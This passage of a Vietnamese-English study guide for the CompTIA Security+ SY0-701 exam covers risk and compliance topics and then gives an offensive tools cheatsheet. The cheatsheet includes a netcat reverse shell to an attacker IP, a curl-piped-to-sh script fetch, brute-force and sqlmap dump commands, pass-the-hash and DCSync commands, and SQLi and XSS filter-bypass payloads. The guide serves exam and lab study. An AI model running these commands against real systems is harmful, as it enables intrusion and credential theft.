## 4.6 — Automation & Orchestration

### Use Cases:
- User/resource provisioning
- Security group management
- Ticket creation & escalation
- Continuous integration/testing
- API integrations

### Benefits:
- Tiết kiệm thời gian (efficiency)
- Enforce consistent baselines
- Scale an toàn
- Giảm human error
- Faster reaction time

### Considerations:
- **Complexity:** Automation phức tạp hơn manual
- **Single Point of Failure:** Nếu automation fail → nhiều thứ fail
- **Technical Debt:** Legacy automation khó maintain
- **Cost:** Đầu tư ban đầu cao

---

# DOMAIN 5: SECURITY PROGRAM MANAGEMENT (20%)

## 5.1 — Security Governance

### Governance Documents:

| Loại | Mô tả |
|---|---|
| **Policy** | High-level statement về security stance |
| **Standard** | Specific technical requirements |
| **Procedure** | Step-by-step instructions |
| **Guideline** | Recommendations (không bắt buộc) |

### Key Policies:
- Acceptable Use Policy (AUP)
- Information Security Policy
- Business Continuity Policy
- Disaster Recovery Policy
- Incident Response Policy
- Change Management Policy
- SDLC Policy

### Governance Structures:
- Boards, Committees
- Government entities
- Centralized vs Decentralized

---

## 5.2 — Risk Management

### Risk Formula:
```
Risk = Threat × Vulnerability × Impact
```

### Risk Assessment Methods:

| Method | Mô tả |
|---|---|
| **Qualitative** | Categorical (Low/Medium/High) — nhanh, chủ quan |
| **Quantitative** | Số học — ALE, SLE, ARO |

### Quantitative Risk Calculations:

| Metric | Formula |
|---|---|
| **SLE (Single Loss Expectancy)** | Asset Value × Exposure Factor |
| **ALE (Annualized Loss Expectancy)** | SLE × ARO |
| **ARO (Annualized Rate of Occurrence)** | Bao nhiêu lần/năm xảy ra |

**Ví dụ:**
- Server giá $100,000
- Exposure Factor = 0.3 (30% damage)
- SLE = $30,000
- Xảy ra 0.5 lần/năm (một lần mỗi 2 năm)
- ALE = $30,000 × 0.5 = $15,000/năm

### Risk Management Strategies:

| Strategy | Mô tả |
|---|---|
| **Transfer** | Mua bảo hiểm, outsource |
| **Accept** | Chấp nhận rủi ro (Exemption / Exception) |
| **Avoid** | Không làm hoạt động gây rủi ro |
| **Mitigate** | Implement controls để giảm rủi ro |

### Risk Appetite:
- **Expansionary:** Chấp nhận rủi ro cao để growth
- **Conservative:** Minimize rủi ro
- **Neutral:** Balanced approach

---

## 5.3 — Third-Party Risk

### Vendor Assessment:
- Penetration testing
- Right-to-audit clause
- Evidence of internal audits
- Independent assessments
- Supply chain analysis

### Agreement Types:

| Agreement | Mô tả |
|---|---|
| **SLA (Service Level Agreement)** | Điều khoản dịch vụ, uptime, response time |
| **MOU (Memorandum of Understanding)** | Thỏa thuận không ràng buộc pháp lý |
| **MOA (Memorandum of Agreement)** | Ràng buộc hơn MOU |
| **NDA (Non-Disclosure Agreement)** | Bảo mật thông tin |
| **MSA (Master Service Agreement)** | Khung hợp đồng tổng thể |
| **BPA (Business Partners Agreement)** | Đối tác kinh doanh |
| **SOW (Statement of Work)** | Chi tiết công việc cần làm |

---

## 5.4 — Compliance

### Key Regulations:

| Regulation | Scope |
|---|---|
| **GDPR** | EU data protection — 72h breach notification |
| **HIPAA** | US healthcare data (PHI) |
| **PCI DSS** | Payment card data |
| **SOX** | Financial reporting |
| **FISMA** | US federal government |

### Consequences of Non-Compliance:
- Fines & Sanctions
- Reputational damage
- Loss of license
- Contractual impacts

### Privacy Concepts:
- **PII:** Personally Identifiable Information
- **PHI:** Protected Health Information
- **Data Sovereignty:** Data phải ở trong jurisdiction nhất định
- **Right to be Forgotten:** Xóa personal data theo yêu cầu
- **Data Minimization:** Chỉ collect data thực sự cần

---

## 5.5 — Penetration Testing

### PenTest Lifecycle:

| Bước | Mô tả |
|---|---|
| **Reconnaissance** | Thu thập thông tin về target |
| **Initial Exploitation** | Gain first access |
| **Persistence** | Maintain access (backdoor) |
| **Privilege Escalation** | Nâng quyền |
| **Lateral Movement** | Di chuyển ngang trong network |
| **Pivoting** | Dùng compromised host để reach network khác |
| **Actions on Objectives** | Steal data / complete mission |
| **Cleanup** | Xóa evidence, remove backdoors |

### PenTest Types:

| Type | Knowledge of target |
|---|---|
| **Black Box** | Unknown environment — no prior knowledge |
| **Gray Box** | Partially known — some info |
| **White Box** | Known environment — full info |

### Reconnaissance Types:
- **Passive:** OSINT, không interact với target (whois, Google, Shodan)
- **Active:** Trực tiếp interact (nmap, ping, banner grabbing)

---

## 5.6 — Security Awareness

### Phishing Training:
- Simulation campaigns
- Recognizing phishing attempts
- Reporting procedures

### Topics:
- Password management
- Social engineering awareness
- Removable media risks
- Remote/hybrid work security
- Insider threat awareness

---

# 🔧 TOOLS & COMMANDS

## Network Reconnaissance

### Nmap
```bash
# Basic scan
nmap <target>

# Service/version detection
nmap -sV <target>

# OS detection
nmap -O <target>

# All scripts + version + OS
nmap -A <target>

# Stealth SYN scan
nmap -sS <target>

# UDP scan
nmap -sU <target>

# Scan specific ports
nmap -p 22,80,443 <target>

# Scan port range
nmap -p 1-1000 <target>

# All ports
nmap -p- <target>

# Output to file
nmap -oN output.txt <target>
nmap -oX output.xml <target>

# Vulnerability scripts
nmap --script vuln <target>

# NSE script specific
nmap --script=smb-vuln-ms17-010 <target>
```

**Mẹo pentest:**
- `-T4` cho speed, `-T0/-T1` cho stealth
- `--open` chỉ show open ports
- `-Pn` skip ping (khi target block ICMP)

---

### Nikto (Web Server Scanner)
```bash
# Basic scan
nikto -h http://target.com

# Scan specific port
nikto -h target.com -p 8080

# Output to file
nikto -h target.com -o output.html -Format html

# With SSL
nikto -h https://target.com -ssl
```

---

### Gobuster / FFuf (Directory Bruteforce)
```bash
# Gobuster
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
gobuster dns -d target.com -w subdomains.txt

# FFuf
ffuf -u http://target.com/FUZZ -w wordlist.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt -e .php,.html,.txt
ffuf -u http://target.com -H "Host: FUZZ.target.com" -w subdomains.txt
```

---

### Hydra (Password Brute Force)
```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target

# Web form (POST)
hydra -l admin -P wordlist.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP
hydra -L users.txt -P passwords.txt ftp://target

# RDP
hydra -l admin -P wordlist.txt rdp://target
```

---

### SQLMap (SQL Injection)
```bash
# Basic
sqlmap -u "http://target.com/page.php?id=1"

# POST request
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Dump database
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Dump tables
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# Dump data
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump

# Bypass WAF
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
```

---

### Netcat (nc) — "Swiss Army Knife"
```bash
# Connect to port
nc target.com 80

# Listen on port
nc -lvnp 4444

# Reverse shell (target)
nc <attacker_ip> 4444 -e /bin/bash

# File transfer (receiver)
nc -lvnp 9999 > file.txt
# File transfer (sender)
nc target.com 9999 < file.txt

# Port scan
nc -zv target.com 1-1000
```

---

### John the Ripper & Hashcat (Password Cracking)
```bash
# John
john hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --format=NT  # NTLM hash

# Hashcat
hashcat -m 0 hash.txt wordlist.txt          # MD5
hashcat -m 1000 hash.txt wordlist.txt       # NTLM
hashcat -m 1800 hash.txt wordlist.txt       # SHA-512 (Linux shadow)
hashcat -m 2500 hash.txt wordlist.txt       # WPA2
hashcat -a 3 hash.txt ?a?a?a?a?a?a         # Brute force 6 chars
```

**Hash types hay gặp:**
- MD5: `5f4dcc3b5aa765d61d8327deb882cf99` (32 hex)
- SHA-1: `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` (40 hex)
- SHA-256: 64 hex
- NTLM: 32 hex (Windows passwords)
- bcrypt: `$2b$12$...`

---

### Burp Suite
- **Proxy:** Intercept HTTP/HTTPS traffic
- **Repeater:** Resend và modify requests
- **Intruder:** Automated attacks (fuzzing, brute force)
- **Scanner:** Automated vuln scanning (Pro only)
- **Decoder:** Encode/decode (Base64, URL, HTML)

**Workflow:**
1. Cấu hình browser proxy → 127.0.0.1:8080
2. Import Burp CA certificate
3. Intercept traffic → Send to Repeater/Intruder

---

### Metasploit Framework
```bash
# Start
msfconsole

# Search for exploit
search ms17_010
search type:exploit platform:windows

# Use exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444

# Check options
show options

# Run
run / exploit

# Common payloads
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x86/shell_reverse_tcp

# Meterpreter commands
sysinfo
getuid
getsystem        # privilege escalation
hashdump         # dump hashes
upload file.txt /tmp/
download /etc/passwd
shell            # get shell
```

---

### LinPEAS / WinPEAS (Privilege Escalation)
```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or upload and run
chmod +x linpeas.sh
./linpeas.sh

# WinPEAS (upload and run on Windows)
.\winPEASx64.exe
```

---

### Impacket (Windows/AD Attacks)
```bash
# SMB enumeration
python3 smbclient.py domain/user:pass@target

# Pass-the-Hash
python3 psexec.py -hashes :NTLMHASH domain/user@target

# Get TGT (Kerberos)
python3 getTGT.py domain/user:password

# Kerberoasting
python3 GetUserSPNs.py domain/user:pass -request

# DCSync (dump AD hashes)
python3 secretsdump.py domain/user:pass@dc_ip
```

---

### BloodHound (AD Attack Paths)
```bash
# Collect data (SharpHound)
.\SharpHound.exe -c All

# Import into BloodHound
# Run BloodHound GUI → Upload data → Run queries

# Key queries:
# "Find Shortest Path to Domain Admins"
# "Find All Domain Admins"
# "Find Kerberoastable Accounts"
```

---

# 🎯 Important Practice & Labs

## Lab 1: Network Reconnaissance
**Kỹ năng:** Nmap scanning, service enumeration  
**Mức độ:** Beginner  
**Tools:** nmap, netcat  
**Lab environments:** TryHackMe "Network Services", HackTheBox Starting Point  

**Mindset:** Luôn scan full port range (`-p-`) trước, sau đó scan services trên ports found. Đừng assume default ports.

---

## Lab 2: Web Application Testing
**Kỹ năng:** SQLi, XSS, directory brute force, IDOR  
**Mức độ:** Intermediate  
**Tools:** Burp Suite, gobuster/ffuf, sqlmap  
**Lab environments:** DVWA, WebGoat, TryHackMe "OWASP Top 10", HackTheBox web challenges  

**Mindset:**
1. Enumerate tất cả endpoints trước
2. Test mọi input field
3. Check source code cho comments/hidden fields
4. Test authentication bypass

---

## Lab 3: Password Attacks
**Kỹ năng:** Hash cracking, password spraying, credential stuffing  
**Mức độ:** Beginner-Intermediate  
**Tools:** John, Hashcat, Hydra  
**Lab environments:** TryHackMe "John the Ripper", CTF challenges  

**Mindset:** Luôn thử common passwords trước, sau đó rockyou.txt, sau đó custom wordlist với cewl.

---

## Lab 4: Active Directory Attacks
**Kỹ năng:** Kerberoasting, Pass-the-Hash, BloodHound, DCSync  
**Mức độ:** Advanced  
**Tools:** Impacket, BloodHound, mimikatz, CrackMapExec  
**Lab environments:** HackTheBox Active Directory machines, TryHackMe "Attacking Active Directory"  

**Mindset:**
1. Enumerate AD users, groups, SPNs
2. Tìm attack paths với BloodHound
3. Kerberoast → crack service account passwords
4. Lateral movement đến Domain Admin

---

## Lab 5: Privilege Escalation (Linux)
**Kỹ năng:** SUID binaries, cron jobs, sudo misconfig, kernel exploits  
**Mức độ:** Intermediate  
**Tools:** LinPEAS, GTFObins  
**Lab environments:** TryHackMe "Linux PrivEsc", HackTheBox Linux machines  

**Checklist PrivEsc Linux:**
```
sudo -l                          # sudo permissions
find / -perm -u=s 2>/dev/null   # SUID binaries
cat /etc/crontab                 # Cron jobs
env                              # Environment variables
cat /etc/passwd                  # Users
ls -la /home/                    # Home directories
find / -writable 2>/dev/null    # Writable files
uname -a                        # Kernel version
```

---

## Lab 6: Privilege Escalation (Windows)
**Kỹ năng:** Service misconfig, AlwaysInstallElevated, token impersonation  
**Mức độ:** Intermediate  
**Tools:** WinPEAS, PowerUp, Juicy Potato  
**Lab environments:** TryHackMe "Windows PrivEsc", HackTheBox Windows machines  

---

## Lab 7: Incident Response & Forensics
**Kỹ năng:** Log analysis, memory forensics, disk forensics  
**Mức độ:** Intermediate  
**Tools:** Volatility, Autopsy, Wireshark, Splunk  
**Lab environments:** TryHackMe "DFIR", Blue team challenges  

---

## Lab 8: Cryptography Challenges
**Kỹ năng:** Hash cracking, cipher analysis, PKI  
**Mức độ:** Beginner-Intermediate  
**Tools:** CyberChef, John, Hashcat, openssl  
**Lab environments:** CTF crypto challenges, CryptoHack  

---

# 🔴 Practical Attacker Notes

## Common Attack Flows

### Web App Pentest Methodology:
```
1. Recon: whois, nmap, wappalyzer, robots.txt, sitemap.xml
2. Enumerate: gobuster/ffuf, nikto
3. Identify tech stack: headers, cookies, error pages
4. Test authentication: default creds, brute force
5. Test inputs: SQLi, XSS, SSTI, command injection
6. Test authorization: IDOR, privilege escalation
7. Test session: cookie flags (httponly, secure, samesite), CSRF
8. Check API endpoints: Swagger UI, /api/v1/, /graphql
```

### Linux Privilege Escalation Cheatsheet:
```bash
# Check sudo
sudo -l

# SUID exploitation (check GTFObins)
find / -perm -u=s -type f 2>/dev/null

# Check for readable shadow/passwd
cat /etc/shadow 2>/dev/null

# Writable cron scripts
cat /etc/crontab
ls -la /etc/cron*

# PATH injection
echo $PATH
# If /tmp is in PATH, create malicious binary there

# Check capabilities
getcap -r / 2>/dev/null

# Running processes as root
ps aux | grep root

# NFS shares
cat /etc/exports
```

### Useful Bypass Techniques:

**WAF Bypass (SQLi):**
```sql
-- Comments to break keywords
SE/**/LECT * FR/**/OM users
-- Case variation
SeLeCt * FrOm users
-- URL encoding
%53%45%4C%45%43%54
-- Time-based blind when output blocked
'; WAITFOR DELAY '0:0:5'--
```

**XSS Bypass:**
```html
<!-- Script tag blocked -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<!-- Case bypass -->
<ScRiPt>alert(1)</ScRiPt>
```

### Pass-the-Hash:
```bash
# With impacket
psexec.py -hashes :NTLMHASH administrator@target

# With CrackMapExec
crackmapexec smb target -u admin -H NTLMHASH
```

### Port Forwarding / Tunneling:
```bash
# SSH local port forward
ssh -L 8080:internal_host:80 user@pivot_host

# SSH remote port forward
ssh -R 8080:localhost:80 user@attacker

# Chisel tunneling
# Attacker
./chisel server -p 8000 --reverse
# Target
./chisel client attacker_ip:8000 R:socks
```

---

# 📚 Learning Roadmap

## Beginner Track
1. **CIA Triad & Basic Security Concepts** ← Nắm vững đầu tiên
2. **Network Fundamentals** (OSI model, TCP/IP, common ports)
3. **Security Controls** (categories + functional types)
4. **Basic Cryptography** (symmetric, asymmetric, hashing, PKI)
5. **Common Threats** (malware types, social engineering)
6. **First Lab:** TryHackMe "Pre-Security" path

## Intermediate Track
7. **Vulnerability Management** (CVSS, CVE, scanning)
8. **IAM** (MFA, SSO, access control models)
9. **Network Security** (firewalls, IDS/IPS, VPN)
10. **Incident Response** (PICERL, forensics basics)
11. **Web Application Security** (OWASP Top 10)
12. **Lab:** TryHackMe "Jr Penetration Tester" path, DVWA

## Advanced Track
13. **Active Directory** (Kerberos, BloodHound, attack paths)
14. **Cloud Security** (AWS/Azure security, shared responsibility)
15. **Advanced Persistence** (fileless malware, LOLBins)
16. **Red Team TTPs** (Mimikatz, Cobalt Strike concepts)
17. **Lab:** HackTheBox Pro Labs, OSCP prep

## SY0-701 Specific Focus:
- ⭐ Domain 4 (Security Operations, 28%) — Nhất định phải master
- ⭐ Incident Response process (PICERL) — Thường xuất hiện
- ⭐ Authentication factors & MFA — Câu hỏi rất hay
- ⭐ Vulnerability management workflow — CVSS, CVE, remediation
- ⭐ Cryptography concepts — PKI, digital signatures, encryption types

---

# 📊 Skill Matrix & Checklists

## Cybersecurity Skills Checklist

### Fundamentals
- [ ] CIA Triad — giải thích được + ví dụ thực tế
- [ ] Security control categories (Technical/Operational/Managerial/Physical)
- [ ] Security control types (Preventive/Detective/Corrective/Deterrent/Compensating/Directive)
- [ ] Defense-in-Depth
- [ ] Zero Trust architecture
- [ ] NIST CSF 5 functions

### Cryptography
- [ ] Symmetric vs Asymmetric — khi nào dùng cái nào
- [ ] Hashing algorithms (MD5, SHA family) — biết thuật toán nào an toàn
- [ ] PKI chain of trust — Root CA → Intermediate CA → End Entity
- [ ] Digital signatures — ai ký bằng gì, ai verify bằng gì
- [ ] Salting & Key Stretching — tại sao cần
- [ ] Certificate fields — CN, SAN, validity, EKU
- [ ] CRL vs OCSP

### Threats & Vulnerabilities
- [ ] Malware types — phân biệt virus/worm/trojan/ransomware/rootkit
- [ ] Social engineering techniques
- [ ] Attack types — SQLi, XSS, CSRF, Buffer Overflow, Directory Traversal
- [ ] Password attacks — brute force, spraying, rainbow table, PtH
- [ ] CVSS scoring — biết mức severity
- [ ] IOC vs IOA
- [ ] APT lifecycle

### Network Security
- [ ] Firewall types — L4 vs L7, WAF, NGFW, UTM
- [ ] IDS vs IPS — passive vs inline
- [ ] VPN types — site-to-site vs remote access
- [ ] 802.1X và NAC
- [ ] Network segmentation — DMZ, VLAN
- [ ] Email security — SPF, DKIM, DMARC

### IAM
- [ ] MFA factors — 3 types + examples
- [ ] Access control models — MAC/DAC/RBAC/ABAC
- [ ] SSO protocols — SAML, OAuth, OpenID Connect, Kerberos
- [ ] PAM — JIT, vaulting, ephemeral credentials
- [ ] Biometrics — FAR/FRR/CER

### Incident Response
- [ ] IR phases — PICERL
- [ ] Digital forensics — legal hold, chain of custody, order of volatility
- [ ] Log analysis — know what to look for
- [ ] SIEM vs SOAR vs EDR vs XDR

### Risk & Compliance
- [ ] Quantitative risk — SLE, ALE, ARO formulas
- [ ] Risk strategies — transfer/accept/avoid/mitigate
- [ ] BIA metrics — RTO, RPO, MTTR, MTBF
- [ ] Major regulations — GDPR, HIPAA, PCI DSS
- [ ] Agreement types — SLA, MOU, NDA, MOA

---

## CTF Skills Checklist

### Reconnaissance
- [ ] Nmap scanning (basic → advanced)
- [ ] OSINT tools (whois, theHarvester, Shodan)
- [ ] Web enumeration (gobuster, ffuf)
- [ ] Subdomain enumeration

### Web Exploitation
- [ ] SQL Injection (manual + sqlmap)
- [ ] XSS (stored, reflected, DOM)
- [ ] CSRF
- [ ] File Inclusion (LFI/RFI)
- [ ] Command Injection
- [ ] IDOR
- [ ] SSRF

### Cryptography
- [ ] Identify hash type (hash-identifier)
- [ ] Crack hashes (John, Hashcat)
- [ ] CyberChef recipes
- [ ] Classical ciphers (Caesar, Vigenere, ROT13)
- [ ] RSA weak key attacks

### Binary/Reversing
- [ ] Buffer overflow basics
- [ ] Ghidra/IDA basics
- [ ] GDB debugging

### Networking
- [ ] Wireshark packet analysis
- [ ] Protocol analysis (HTTP, FTP, SMB, DNS)
- [ ] Netcat usage

### Steganography
- [ ] steghide, binwalk, strings
- [ ] Image/audio analysis
- [ ] LSB steganography

---

## eJPT Skills Checklist

### Assessment
- [ ] Network scan với nmap
- [ ] Host discovery
- [ ] Service enumeration
- [ ] Web application testing
- [ ] Vulnerability identification

### Exploitation
- [ ] Metasploit basic usage
- [ ] Manual exploitation
- [ ] Web shell upload
- [ ] Password cracking

### Post-Exploitation
- [ ] File system navigation
- [ ] Finding sensitive files
- [ ] Pivot through networks
- [ ] Basic privilege escalation

---

## Top 20 Practice Items (Làm đi làm lại)

1. **Nmap full scan + service enumeration** — mọi ngày đều cần
2. **Gobuster/ffuf directory enumeration** — web pentest bắt buộc
3. **Burp Suite intercept + repeater** — web pentest cốt lõi
4. **SQLi manual testing** — biết nguyên lý trước khi dùng sqlmap
5. **XSS basic payloads** — `<script>alert(1)</script>` và variants
6. **Hashcat/John cracking** — rockyou.txt là bạn thân
7. **Metasploit search → use → set → exploit** — workflow cơ bản
8. **Netcat reverse shell** — cần thuộc lòng
9. **Linux privilege escalation checklist** — sudo, SUID, cron, PATH
10. **Windows privilege escalation** — WinPEAS interpretation
11. **Wireshark filter syntax** — `tcp.port == 80`, `http.request`, v.v.
12. **SSH port forwarding** — tunneling qua pivot
13. **Password spraying với Hydra** — tránh lockout
14. **Certificate analysis với openssl** — `openssl x509 -in cert.pem -text`
15. **Log analysis** — tìm anomaly trong auth logs
16. **Incident response tabletop** — đi qua PICERL với scenario
17. **Risk calculation** — SLE × ARO = ALE
18. **CVSS score reading** — interpret vector string
19. **Active Directory enumeration** — ldapsearch, BloodHound
20. **Steganography basics** — `strings`, `binwalk`, `steghide`

---

# 📖 Sources

| Nội dung | Nguồn |
|---|---|
| Exam Objectives, Domain structure, % | CompTIA-Security-Plus-SY0-701-Exam-Objectives.pdf |
| Security concepts, CIA, controls, crypto, attacks | CompTIA_Security__SYO-701_Study_Guide_concise.pdf |
| Course overview (Vietnamese) | Khóa_học_CompTIA_Security_.pdf (IPMAC) |
| Practice questions | CompTIA_Security__Practice_Tests_SY0-701-Sybex_2024.pdf |
| Comprehensive study | CompTIA-Security-Study-Guide-SY0-701-9th-Edition.pdf |
| Official curriculum | official-comptia-security-student-guide.pdf |
| All-in-one reference | 1_AllInOne.pdf |
| Official student guide | 5_Student_Guide.pdf |

---

*Tài liệu này được tổng hợp từ toàn bộ tài liệu khóa học. Ưu tiên thực hành hàng ngày trong lab environments.*

**Chúc bạn thi đỗ SY0-701! 🎯**
